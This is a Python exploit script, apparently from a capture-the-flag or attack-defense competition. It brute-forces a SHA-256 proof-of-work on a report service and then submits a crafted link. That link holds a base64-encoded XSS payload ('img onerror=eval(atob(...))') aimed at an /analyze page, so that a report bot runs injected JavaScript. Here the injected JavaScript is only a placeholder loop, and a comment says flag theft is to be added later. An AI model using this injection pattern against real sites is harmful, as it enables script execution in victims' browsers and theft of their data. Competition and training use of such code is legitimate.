#!/usr/bin/env python3

import re
import sys
import time
import requests
from os import urandom
from hashlib import sha256
from base64 import b64encode, b64decode

report_url = ''
service_url = ''

def crack(salt, suffix):
    seq = b''
    while not sha256(salt + seq).digest().endswith(suffix):
        seq = urandom(8)
    return b64encode(seq)


def send_link(message):
    '''
    Sends a link and returns the UUID.
    '''
    s = requests.Session()
    r = s.get(report_url)
    
    b64salt = re.findall('salt \(b64-encoded\) <code>(.*?)</code>', r.text)[0]
    b64suffix = re.findall('suffix \(b64-encoded\) <code>(.*?)</code>', r.text)[0]
    salt = b64decode(b64salt)
    suffix = b64decode(b64suffix)
    
    
    print(f'Cracking {salt}, {suffix}')
    seq = crack(salt, suffix)
    print(f'Cracking done {seq}')

    r = s.post(report_url, data={'pow': seq, 'link': message})
    try:
        link_uuid = re.findall('<a href="/report/(.*?)">here', r.text)[0]
    except Exception as e:
        print(r.text)
        raise e

    return link_uuid


def get_payload():
    '''
    Returns the link containing the payload.
    '''
    payload = '''
        while(true) {
            console.log(1);
        }'''
    b64payload = b64encode(payload.encode()).decode()
    return '{}/analyze#{}@'.format(
        service_url,
        b64encode(f'<img src=asdad onerror=eval(atob("{b64payload}"))>'.encode()).decode()
    )


def main():
    global report_url, service_url

    ip = sys.argv[1]
    report_url  = f'http://{ip}:11111'
    service_url = f'http://{ip}:10010'

    # not sending any exploit here, just a placeholder to append flags later
    send_link(get_payload())
    

if __name__ == '__main__':
    main()
